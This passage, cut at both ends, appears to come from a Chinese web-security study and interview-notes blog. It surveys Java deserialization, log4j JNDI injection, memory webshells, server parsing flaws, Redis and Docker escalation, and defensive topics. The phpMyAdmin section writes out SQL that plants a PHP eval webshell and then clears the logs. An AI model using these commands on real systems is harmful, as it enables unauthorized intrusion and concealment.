title="绕过"></a>绕过</h3><p>1.2.25，1.2.42，1.2.44，1.2.45不断加入L; [等字符绕过过滤</p><p>1.2.47后利用autoType关闭时自动加载缓存的机制</p><p>加载缓存中的Class类，反序列时自动加载val对应的类</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20250213150032630.png" alt="image-20250213150032630"></p><p>1.2.68后利用异常</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20250213150232028.png" alt="image-20250213150232028"></p><h2 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h2><p>(用于解析 java，部署大型分布式 Web 应用的 Web 中间件。）</p><p>分类：</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/Hjw5b5XHQofnYuxKsuoc4D6Bnzg.png"></p><p>1.weblogic 控制台的 7001 端口默认开启 T3 协议服务，T3 协议缺陷实现了 RMI</p><p>2.weblogic WLS Security 组件对外提供 webservice，使用 XMLDecoder 解析 XML 数据，存在反序列化漏洞</p><p>最早的版本过滤了object 后来用void绕过</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20250213151715343.png" alt="image-20250213151715343"></p><p>指明使用XMLDecoder类，调用恶意类ProcessBuilder，调用start方法，传入字符数组</p><h2 id="log4j2"><a href="#log4j2" class="headerlink" title="log4j2"></a>log4j2</h2><p>（apache 日志库）</p><p>2.15.0&gt;log4j2&gt;2.0.0</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/BFVPbPpJjo19anxOaf3cGbFmncf.png"></p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/HT0TbHBsZoo4QUxSpaRc5kH3nFf.png"></p><h3 id="远程代码执行原理"><a href="#远程代码执行原理" class="headerlink" title="远程代码执行原理"></a>远程代码执行原理</h3><p>日志在打印的时候遇到 ${后以：分割为 prefix 和 key，对于 prefix 会调用 lookup 方法并且带入 key 参数</p><p>由于 JNDI 出栈没有做好过滤,攻击者利用 lookup 功能对{}内内容的解析进行 JNDI 注入，受害者请求远程服务来链接本地对象，在{}中调用 JNDI 接口（LDAP&#x2F;RMI 服务）向攻击者提前部署好的恶意站点获取恶意的.class 对象并运行代码</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/Skekbkecbomq9QxJHFvcVk4onHh.png"></p><p>此时的 JNDI 服务调用 RMI 服务，RMI 通过 Reference 类绑定了一个外部远程对象</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/J2DobQIXpoIyVPxFzfpcux7Fnvd.png"></p><h3 id="原理流程"><a href="#原理流程" class="headerlink" title="原理流程"></a>原理流程</h3><p>1.目标代码调用了 InitialContext.lookup(URI)且 URL 为恶意 RMI 地址</p><p>2.恶意 RMI 服务器返回一个 Reference 对象，其中有一个恶意的 factory 类</p><p>3.factory 被动态加载并且实例化，接着调用 factory.getObjectInstance()获取外部远程对象实例</p><p>（代码可以写入 factory 类的 getObjectInstance，构造方法，静态代码块等位置）</p><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><p>ldap</p><p>编写反弹 shell 语句，base64 编码。攻击机上存放恶意.java 文件并且编译为.class，同一目录下开启 http 服务，开启 LDAP 服务(1389 端口)</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/QcR8bXl6vo1aMqxVCbncLLVpnqc.png"></p><p>再新建一个 shell 开启监听，在 JNDL 注入点，最后的是 class 文件名前缀，ip 是 http 服务的 ip</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/DPXqb3UMMoqOGIx7MsVcfzIinPg.png"></p><h3 id="Jndi高版本注入"><a href="#Jndi高版本注入" class="headerlink" title="Jndi高版本注入"></a>Jndi高版本注入</h3><h4 id="jdk（-8u191）"><a href="#jdk（-8u191）" class="headerlink" title="jdk（&gt;8u191）"></a>jdk（&gt;8u191）</h4><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241127163323424.png" alt="image-20241127163323424"></p><p>默认禁止了codebase的加载</p><p>绕过分析：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">ldap lookup的<span class="hljs-keyword">JavaFactory（必须是ObjectFactory的子类）可以来自codebase或者本地的类地址，然后获得实例后构建JavaClassName指定的对象，最后log4j调用toString转换为字符串</span><br><span class="hljs-keyword"></span><br>例如<span class="hljs-keyword">BeanFactory类 </span>他的默认构造函数可以实例化一个类的同时调用任意只有string参数的方法，再去利用ELProcessor类rce<br></code></pre></td></tr></table></figure><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241127163705453.png" alt="image-20241127163705453"></p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241127163805742.png" alt="image-20241127163805742"></p><p>那么 无法调用远程codebase的高版本jdk（&gt;8u191）只需要找到一个ObjectFactory子类且可利用的java本地类即可</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241127164919024.png" alt="image-20241127164919024"></p><p>例如BeanFactory类 他的默认构造函数可以实例化一个类的同时调用任意只有string参数的方法</p><p>再去利用ELProcessor类</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241127165012947.png" alt="image-20241127165012947"></p><h4 id="log4j2-2-15-rc1"><a href="#log4j2-2-15-rc1" class="headerlink" title="log4j2 (2.15-rc1)"></a>log4j2 (2.15-rc1)</h4><p>对jndi的host port 加载的java类型等进行了限制</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20241127170940753.png" alt="image-20241127170940753"></p><h2 id="struct2"><a href="#struct2" class="headerlink" title="struct2"></a>struct2</h2><p>.action \.do文件</p><p>OGNL：用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p><p>st2-045：注意请求头Content-Type</p><h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2><blockquote><p>原理：通过在 Java 虚拟机（JVM）中运行的恶意代码，实现对被攻击者系统的远程控制。其原理是通过在 Java 虚拟机中注入特定的 Java 类、变量或方法等 Java 对象，然后在 Java 虚拟机中运行这些代码，实现对受害者机器的远程控制</p></blockquote><h3 id="Tomcat-实现内存马的方式"><a href="#Tomcat-实现内存马的方式" class="headerlink" title="Tomcat 实现内存马的方式"></a><strong>Tomcat 实现内存马的方式</strong></h3><h4 id="Servlet-API-型"><a href="#Servlet-API-型" class="headerlink" title="Servlet-API 型"></a><strong>Servlet-API 型</strong></h4><p>  通过命令执行等方式动态注册一个新的 listener、filter 或者 servlet，从而实现命令执行等功能。特定框架、容器的内存马原理与此类似，如 tomcat 的 value 内存马</p><h5 id="filter-型内存马"><a href="#filter-型内存马" class="headerlink" title="filter 型内存马"></a><strong>filter 型内存马</strong></h5><p>  所谓 filter 内存马，就是在 web 容器中创建了含有恶意代码的 filter，在请求传递到 servlet 前被拦截下来且执行了恶意代码。</p><h5 id="servlet-型内存马"><a href="#servlet-型内存马" class="headerlink" title="servlet 型内存马"></a><strong>servlet 型内存马</strong></h5><p>  servlet 型的内存马原理就是注册一个恶意的 servlet，与 filter 相似，只是创建过程不同。</p><p>  核心还是看 <strong>StandardContext</strong>，在 init filter 后就调用了 loadOnStartup 方法实例化 servlet</p><p>  可以发现 servlet 的相关信息是保存在 StandardContext 的 children 字段。</p><h5 id="listener-型内存马"><a href="#listener-型内存马" class="headerlink" title="listener 型内存马"></a><strong>listener 型内存马</strong></h5><p>  listener 用于监听时间的发生或状态的改变，其初始化与调用顺序在 filter 之前。</p><p>  listener 选择很多。我们选择与 request 相关的 ServletRequestListener。</p><p>  Tomcat 使用两类 Listener 接口分别是 org.apache.catalina.LifecycleListener 和原生 Java.util.EventListener。</p><p>  一般作为 webshell，需要对网站发送请求使用 Java.util.EventListener。</p><h4 id="字节码增强型"><a href="#字节码增强型" class="headerlink" title="字节码增强型"></a><strong>字节码增强型</strong></h4><p>  通过 java 的 instrumentation 动态修改已有代码，进而实现命令执行等功能。</p><h4 id="查杀思路"><a href="#查杀思路" class="headerlink" title="查杀思路"></a><strong>查杀思路</strong></h4><ul><li><p>检查日志，相同路径但是参数不同，页面不存在返回200</p></li><li><p>中间件日志报错</p></li><li><p>流量分析</p></li><li><p>利用 Java Agent 遍历加载到内存中的 Class</p></li><li><p>先判断是否是内存马，是则进入内存查杀。</p></li></ul><h4 id="特征判断"><a href="#特征判断" class="headerlink" title="特征判断"></a><strong>特征判断</strong></h4><ul><li><p>（关键字）根据 shell 或者随机数关键字</p></li><li><p>（优先级）根据 Filter 优先级；为了使权限最大化，保证在各种情况下都可以访问，需要把优先级调到最高</p></li><li><p>（加载器）根据特殊的 classloader（类加载器）、 Filter 对应的 ClassLoader 目录进行检测； Filter 也是一种 Class，必定需要特定的 classloader（类加载器）</p></li><li><p>（恶意代码）把内存中 class 导出，反编译之后查看是否存在恶意代码；如调用的了一些特殊的方法</p><ul><li>java.lang.Runtime.getRuntime</li><li>defineClass</li><li>Invoke</li></ul></li><li><p>（配置）web.xml 中没有 fitter 配置</p></li></ul><h2 id="JBOSS"><a href="#JBOSS" class="headerlink" title="JBOSS"></a>JBOSS</h2><p>Jboss 是一个管理 EJB 的容器和服务器。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p>jbossmq-httpil&#x2F;HTTPServerILServlet<br>invoker&#x2F;readonly<br>invoker&#x2F;JMXInvokerServlet</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>程序获取 http 请求数据保存到 httpRequest 中，进一步处理后保存到变量 ois 中，然后程序没有对该数据进行过滤，直接使用 readObject()方法进行反序列化。</p><h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="phpmyadmin"><a href="#phpmyadmin" class="headerlink" title="phpmyadmin"></a>phpmyadmin</h2><h3 id="Select-into-outfile-写入"><a href="#Select-into-outfile-写入" class="headerlink" title="Select into outfile 写入"></a>Select into outfile 写入</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><p>1.web 目录写权限以及单引号</p><p>2.绝对路径（phpinfo&#x2F;php 探针&#x2F;报错）</p><p>3.secure_file_priv 没有具体值</p><blockquote><p>show global variables like ‘%secure%’; 查看当前设置<br>1.当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入 | 导出，此时无法提权</p><ol start="2"><li>当 secure_file_priv 的值为 &#x2F;tmp&#x2F; ，表示限制 mysqld 的导入 | 导出只能发生在 &#x2F;tmp&#x2F; 目录下，此时也无法提权</li><li>当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入 | 导出做限制，此时可提权 在 MySQL 的配置文件 my.ini 中进行配置</li></ol></blockquote><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$POST</span>[<span class="hljs-number">1</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; INTO OUTFILE &#x27;D:\\phpStudy\\PHPTutorial\\WWW\\a.php&#x27; 这里需要注意的一个点是路径需要用”\“</span><br></code></pre></td></tr></table></figure><h3 id="日志写入"><a href="#日志写入" class="headerlink" title="日志写入"></a>日志写入</h3><p>1.查看配置</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams">SHOW <span class="hljs-keyword">VARIABLES</span> LIKE ‘<span class="hljs-comment">%general%</span><br>查看mysql的日志状态，默认是关闭的<br>general_log_file为日志保存的位置<br></code></pre></td></tr></table></figure><p>2.开启 general_log 模式</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-built_in">set</span> <span class="hljs-built_in">global</span> general_log = <span class="hljs-keyword">on</span>;<br>记录用户输入的每条命令并保存在 C:\phpStudy\MySQL\<span class="hljs-built_in">data</span>\stu1.<span class="hljs-keyword">log</span> 的文件中<br>开启general_log之后把general_log_file的值修改为该网站默认路径下的某一个自定义的php文件中，然后通过<span class="hljs-keyword">log</span>日志进行写入一句话木马，然后再进一步利用<br></code></pre></td></tr></table></figure><p>3.修改日志目录为 shell 地址</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">set</span> global <span class="hljs-attribute">general_log_file</span>=<span class="hljs-string">&#x27;C:\\phpStudy\\MySQL\\data\\shell.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p>4.写入 shell 并连接利用</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;</span><br></code></pre></td></tr></table></figure><p>5.抹除痕迹</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;C:\\phpStudy\\MySQL\\data\\stu1.log&#x27;</span>;<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log = <span class="hljs-keyword">off</span>;<br><span class="hljs-keyword">SHOW</span> VARIABLES <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%general%&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="绕过disable-funcion"><a href="#绕过disable-funcion" class="headerlink" title="绕过disable_funcion"></a>绕过disable_funcion</h2><blockquote><p><a href="https://www.cnblogs.com/zw1sh/p/12632126.html">bypass disable_function的方法及蚁剑插件bypass-php-function使用 - zw1sh - 博客园 (cnblogs.com)</a></p></blockquote><h3 id="apache-mod-cgi"><a href="#apache-mod-cgi" class="headerlink" title="apache mod_cgi"></a>apache mod_cgi</h3><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627173315087.png" alt="image-20240627173315087"></p><p>前提<img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627173252656.png" alt="image-20240627173252656"></p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240627173423213.png" alt="image-20240627173423213"></p><h3 id="LD-preload"><a href="#LD-preload" class="headerlink" title="LD_preload"></a>LD_preload</h3><p>写一个动态链接文件<img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20240906104037469.png" alt="image-20240906104037469"></p><h3 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h3><h3 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h3><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h4><h4 id="FFI"><a href="#FFI" class="headerlink" title="FFI"></a>FFI</h4><h4 id="COM"><a href="#COM" class="headerlink" title="COM"></a>COM</h4><h2 id="PHP-爆路径"><a href="#PHP-爆路径" class="headerlink" title="PHP 爆路径"></a>PHP 爆路径</h2><p>单引号，错误路径报错</p><p>phpinfo 和 phpmyadmin 探针</p><p>任意文件读取</p><p>图片路径</p><h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><p>路径：SCRIPT_FILENAME DOCUMENT_ROOT</p><p>支持程序：如redis，mysql，fastcgi，gopher</p><p>真实ip：_SERVER[“SERVER_ADDR”] （绕cdn）</p><p>敏感配置：远程文件包含，文件读取，禁用函数名，基础目录，短标签，配置文件位置</p><h1 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h1><h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><h3 id="罕见后缀名"><a href="#罕见后缀名" class="headerlink" title="罕见后缀名"></a>罕见后缀名</h3><p>asa cer cdx</p><h3 id="分号截断"><a href="#分号截断" class="headerlink" title="分号截断"></a>分号截断</h3><p>ap.asp;,jpg </p><h3 id="PUT文件上传"><a href="#PUT文件上传" class="headerlink" title="PUT文件上传"></a>PUT文件上传</h3><h3 id="MS15-034"><a href="#MS15-034" class="headerlink" title="MS15-034"></a>MS15-034</h3><p>HTTP.sys RCE</p><h3 id="文件夹解析-5-x-6-x"><a href="#文件夹解析-5-x-6-x" class="headerlink" title="文件夹解析**(5.x-6.x**)"></a>文件夹解析**(5.x-6.x**)</h3><p>&#x2F;xx.asp&#x2F;xx.jpg(控制文件夹名字就可以让此文件夹下文件执行) </p><h3 id="CGI漏洞-7-0-7-5-：默认开启-Fast-CGI"><a href="#CGI漏洞-7-0-7-5-：默认开启-Fast-CGI" class="headerlink" title="CGI漏洞(7.0-7.5)：默认开启 Fast-CGI"></a>CGI漏洞(7.0-7.5)：默认开启 Fast-CGI</h3><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/Su01byOoWoZ48pxdmpUc24l5nud.png"></p><p>上传如上文件，访问路径&#x2F;1.jpg&#x2F;.php 会导致图片被解析为 php 并生成 shell </p><h2 id="Ngnix"><a href="#Ngnix" class="headerlink" title="Ngnix"></a>Ngnix</h2><h3 id="CGI漏洞"><a href="#CGI漏洞" class="headerlink" title="CGI漏洞(&lt;0.8.37)"></a>CGI漏洞(&lt;0.8.37)</h3><p>和 IIS 7.0&#x2F;7.5 一致</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/Dv0UbKkPeoWXlUx6jJ0cEW5Anvc.png"></p><h3 id="00-空字节"><a href="#00-空字节" class="headerlink" title="%00 空字节"></a>%00 空字节</h3><p>Nginx 0.5.*</p><p>Nginx 0.6.*</p><p>Nginx 0.7 &lt;&#x3D; 0.7.65</p><p>Nginx 0.8 &lt;&#x3D; 0.8.37</p><p>xxx.php%00.jpg</p><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><h3 id="文件名解析"><a href="#文件名解析" class="headerlink" title="文件名解析"></a>文件名解析</h3><p>从右到左，例如上传一个 xie.php.rar，无法识别 rar 会走到 php</p><h3 id="罕见后缀"><a href="#罕见后缀" class="headerlink" title="罕见后缀"></a>罕见后缀</h3><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/WX10b59fboQWbixYrtYcVfG1nLb.png"></p><h3 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h3><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/WeWEbB3xWojY1Qxt1oUchbdinSc.png"></p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>CVE-2021-42013</p><p>2e url编码路径穿越后文件包含，可以包含&#x2F;bin&#x2F;sh</p><p>若开启<strong>cgi-bin</strong>可以rce</p><h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><p>windows： xx.jpg[空格或.]会被默认删除，可绕过黑名单</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20250226151059973.png" alt="image-20250226151059973"></p><p>总结：IIS的文件夹解析和FASTCGI，Nginx的FASTCGI和%00空字节，apache多后缀和罕见后缀</p><h1 id="Redis-提权"><a href="#Redis-提权" class="headerlink" title="Redis 提权"></a>Redis 提权</h1><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/DYuWb0o8yocza9xZvffcxu82nye.png"></p><p><a href="https://www.cnblogs.com/h0cksr/p/16189728.html">渗透测试怎么利用 Redis 提权 - h0cksr - 博客园 (cnblogs.com)</a></p><p>默认端口 6379</p><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>一.登录 redis</p><p>默认无密码与弱口令&#x2F;未授权访问</p><p>二.提权</p><p>1.写入 webshell</p><p>2.公私钥获取 root 权限</p><p>3.crontab 定时任务反弹 shell</p><p>软连接</p><ul><li>只有centos才可以： <strong>因为默认redis写⽂件后是644的权限</strong>，但ubuntu要求执⾏定时任务⽂件**&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;<username>权限必须是600<strong>也就是-rw———-才会执⾏，否则会报 错(root) INSECURE MODE (mode 0600 expected)，</strong>⽽Centos的定时任务⽂ 件&#x2F;var&#x2F;spool&#x2F;cron&#x2F;<username>权限644**</li><li>执⾏redis保存RDB会存在乱码，在Ubuntu上 会报错，⽽在Centos上不会报错 </li><li>然后由于系统的不同，crontrab定时⽂件位置也会不同</li></ul><p>4.主从复制 rce</p><p>解决脏数据：fulshall清除内容，select xx切换数据库</p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>更改端口</p><p>修改口令</p><p>绑定内网</p><p>开启保护模式</p><h1 id="docker逃逸"><a href="#docker逃逸" class="headerlink" title="docker逃逸"></a>docker逃逸</h1><h2 id="检查环境"><a href="#检查环境" class="headerlink" title="检查环境"></a>检查环境</h2><p>ls -al &#x2F; 寻找.dockerenv</p><p>cat &#x2F;proc&#x2F;1&#x2F;cgroup</p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="Docker-Remote-Api-未授权访问"><a href="#Docker-Remote-Api-未授权访问" class="headerlink" title="Docker Remote Api 未授权访问"></a>Docker Remote Api 未授权访问</h3><p>2375端口，特权模式拉取一个镜像后挂载宿主机进入一个新建的目录，然后目录中写一个sh文件反弹shell</p><h3 id="特权模式逃逸"><a href="#特权模式逃逸" class="headerlink" title="特权模式逃逸"></a>特权模式逃逸</h3><p>cat &#x2F;proc&#x2F;self&#x2F;status|grep Cap检查0000003fffffffff</p><p>同上挂载，还可以写计划任务，ssh公钥，chroot换目录</p><h3 id="危险挂载"><a href="#危险挂载" class="headerlink" title="危险挂载"></a>危险挂载</h3><h3 id="Docker-Socket挂载"><a href="#Docker-Socket挂载" class="headerlink" title="Docker Socket挂载"></a>Docker Socket挂载</h3><h3 id="宿主机procfs"><a href="#宿主机procfs" class="headerlink" title="宿主机procfs"></a>宿主机procfs</h3><h3 id="脏牛"><a href="#脏牛" class="headerlink" title="脏牛"></a>脏牛</h3><h3 id="runC"><a href="#runC" class="headerlink" title="runC"></a>runC</h3><h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><h2 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h2><p>21 ftp</p><p>22 ssh</p><p>23 telnet</p><p>25 smtp</p><p>101 pop3</p><p>135 rpc</p><p>139 445 SMB netbios MS170</p><p>389 LDAP协议</p><p>3389 远程桌⾯</p><p>5985 winrm</p><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>1433 MSSQL</p><p>1521 Oracle</p><p>3306 MySQL</p><p>5432 PostgreSQL</p><h2 id="web服务"><a href="#web服务" class="headerlink" title="web服务"></a>web服务</h2><p>80-89 web</p><p>8000-9090 web</p><h2 id="特殊服务"><a href="#特殊服务" class="headerlink" title="特殊服务"></a>特殊服务</h2><p>443 SSL⼼脏滴⾎</p><p>2601、2604 zebra路由，默认密码zebra</p><p>873 Rsync未授权</p><p>5984 CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a></p><p>6379 redis未授权</p><p>7001、7002 weblogic默认弱⼝令、反序列化</p><p>9200、9300 elasticsearch 参考乌云：多玩某服务器ElasticSearch命令执⾏漏洞</p><p>11211 memcache未授权访问</p><p>50000 SAP命令执⾏</p><p>50070、50030 hadoop默认端⼝未授权访问</p><h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><p>Microsoft-DS traffic : 445&#x2F;TCP 445&#x2F;<a href="https://so.csdn.net/so/search?q=UDP&spm=1001.2101.3001.7020">UDP</a> </p><p>Kerberos : 88&#x2F;TCP 88&#x2F;UDP </p><p>LDAP ping : 389&#x2F;UDP </p><p>DNS : 53&#x2F;TCP 53&#x2F;UDP </p><p>NetBIOS的相关服务 ： 137&#x2F;TCP 137&#x2F;UDP 138&#x2F;UDP 139&#x2F;UDP 开放这些连续的端口，以便于通过防火墙来使用</p><h1 id="面试小问题"><a href="#面试小问题" class="headerlink" title="面试小问题"></a>面试小问题</h1><h2 id="七层协议"><a href="#七层协议" class="headerlink" title="七层协议"></a>七层协议</h2><p>物理 数据链路 网络 传输 会话 表达 应用层</p><h2 id="蜜罐如何欺骗攻击者"><a href="#蜜罐如何欺骗攻击者" class="headerlink" title="蜜罐如何欺骗攻击者"></a>蜜罐如何欺骗攻击者</h2><p>协议：模拟对应协议响应，指纹</p><p>数据：伪造真实数据插入数据库，文件等</p><p>流量：伪造流量回显，定期发送同步流量</p><p>web：开放高危端口</p><p>交互：允许登录 返回提权成功数据</p><h2 id="工控流量"><a href="#工控流量" class="headerlink" title="工控流量"></a>工控流量</h2><p>协议层 </p><p>修改默认协议头，增加响应延迟</p><p>Modbus：监听端口 响应03 05等功能码，返回伪造寄存器数值</p><p>西门子PLC（s7comm）：伪造握手协议，响应S7 Read&#x2F;write返回plc型号</p><p>DNP3：模拟主从站点通信，伪造二进制点</p><p>留下nday</p><p>型号，web界面伪造</p><p>动态生成随机数据</p><p>发送真实工控流量巡检的噪声</p><h2 id="检测蜜罐"><a href="#检测蜜罐" class="headerlink" title="检测蜜罐"></a>检测蜜罐</h2><p>大量指纹 js 特征 网站速度 </p><p>开放大量端口</p><p>bp查看下流数据</p><p>数据流是否是动态近期的</p><h2 id="下载文件的命令"><a href="#下载文件的命令" class="headerlink" title="下载文件的命令"></a>下载文件的命令</h2><p>windows</p><ol><li>FTP</li><li>VBS</li><li>bitsman</li><li>cerutil</li><li>ps（New-Object System.Net.WebClient）</li><li>wget</li><li>curl</li></ol><p>linux</p><ol><li>curl</li><li>wget</li><li>scp</li><li>rz</li><li>netcat</li><li>git clone</li></ol><h2 id="shiro长度限制"><a href="#shiro长度限制" class="headerlink" title="shiro长度限制"></a>shiro长度限制</h2><p>System.setProperty写入系统属性</p><p>通过线程对象的名字来存储payload</p><p>文件落地分块传输</p><h2 id="webshell不能执行命令"><a href="#webshell不能执行命令" class="headerlink" title="webshell不能执行命令"></a>webshell不能执行命令</h2><p>disable_func</p><p>注册表缺少组件</p><p>waf</p><p>cmd被降权</p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/mdghk73zpebyu_0f8ca819a35240cebd7236880f80957e.png" alt="img"></p><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/mdghk73zpebyu_add536ead21b4f0099fb7ae0e20e2050.png" alt="img"></p><h2 id="http和https"><a href="#http和https" class="headerlink" title="http和https"></a>http和https</h2><p>基于SSL&#x2F;TLS协议，包含：</p><ul><li>公钥：加密数据</li><li>证书颁发机构 CA签名：保证证书真实性和信任</li><li>证书持有者信息：包含域名和组织信息</li></ul><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/image-20250401125319817.png" alt="image-20250401125319817"></p><p>##什么情况没有referer头</p><p>手动清除</p><p>https跳到http</p><p>meta标签禁止</p><p>referer-policy</p><p>隐私模式</p><h2 id="JWT安全问题"><a href="#JWT安全问题" class="headerlink" title="JWT安全问题"></a>JWT安全问题</h2><p>加密算法置空</p><p>jwt数据敏感</p><p>秘钥混淆攻击：RS256可换为HS256</p><p>无效令牌</p><p>暴力破解</p><p>头部注入</p><h2 id="JDK高版本安全修复"><a href="#JDK高版本安全修复" class="headerlink" title="JDK高版本安全修复"></a>JDK高版本安全修复</h2><p>JNDI (8u191) 禁止了远程加载，必须继承ObjectFactory：利用本地类BeanFactory实例化一个类如ELProcessor</p><h2 id="企业内部钓鱼检测思路"><a href="#企业内部钓鱼检测思路" class="headerlink" title="企业内部钓鱼检测思路"></a>企业内部钓鱼检测思路</h2><p>邮件网关过滤</p><ul><li>配置上启用SPF DKIM DMARC，拦截伪造域名</li><li>URL分析 识别短连接</li><li>附件沙箱扫描 禁用宏</li></ul><p>流量监控</p><ul><li>dns请求监控</li><li>防护域前置，检测host头</li><li>ai识别异常访问</li></ul><p>端点安全</p><ul><li>监控异常行为与进程</li><li>保护浏览器安全</li></ul><h2 id="云存储桶漏洞"><a href="#云存储桶漏洞" class="headerlink" title="云存储桶漏洞"></a>云存储桶漏洞</h2><ul><li>可遍历桶</li><li>bucket爆破</li><li>任意文件上传覆盖</li><li>bucket接管</li><li>ak sk</li><li>配置可写</li></ul><h2 id="绕cdn"><a href="#绕cdn" class="headerlink" title="绕cdn"></a>绕cdn</h2><p>从cdn本身出发：</p><ol><li>历史记录</li><li>多地区</li><li>子域名</li><li>空间引擎，censys搜ssl</li></ol><p>从漏洞：</p><ol><li>邮件（发邮件给不存在的地址，失败后返回ip）</li><li>ssrf</li><li>ping dnslog</li></ol><p>从网站配置：</p><ol><li>源代码，探针，phpinfo等配置信息</li></ol><p><img src="/2024/09/16/web%E7%9F%A5%E8%AF%86/HZT7bYxxUoqQSyxHy5YcVnhEnPd.png"></p><h2 id="sqlmap-os-shell原理"><a href="#sqlmap-os-shell原理" class="headerlink" title="sqlmap os-shell原理"></a>sqlmap 